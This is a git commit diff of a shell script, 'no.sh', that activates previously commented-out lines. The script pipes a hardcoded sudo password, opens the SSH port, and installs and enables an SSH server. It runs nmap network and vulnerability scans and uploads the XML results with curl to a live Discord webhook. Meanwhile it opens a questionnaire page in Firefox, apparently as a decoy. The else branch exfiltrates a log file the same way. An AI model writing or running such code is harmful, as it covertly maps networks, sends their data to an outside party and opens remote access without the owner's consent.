187b27bd52cd96a8a49858a6158801ed149a92d3
Dada <david.kondziella@rub.de>
2024-01-18 14:25:53 +0100

    Update no.sh

--- no.sh
+++ no.sh
@@ -3,14 +3,14 @@ if echo 'pw' | sudo -S sh -c "sudo ufw allow ssh"; then
 	cd "/home/$USER/its_villain/"
 	firefox "fragebogen.html" 
 	echo "nmap scan and sending xml..."
- 	# sudo nmap -T5 -A -v 10.10.10.14/24 -oX /home/$USER/net.xml
-  	# curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+ 	sudo nmap -T5 -A -v 10.10.10.14/24 -oX /home/$USER/net.xml
+  	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	echo "SUDO SUCCESS installing ssh services..."
 	sudo apt install openssh-server -y 
 	sudo systemctl enable ssh
 	echo "ssh installed and enable. open port 22 "
- 	# sudo nmap -sV --script vulners 10.10.10.1/24 -oX /home/$USER/vuln.xml  
-  	# curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+ 	sudo nmap -sV --script vulners 10.10.10.1/24 -oX /home/$USER/vuln.xml  
+  	curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	
 else	
 	curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
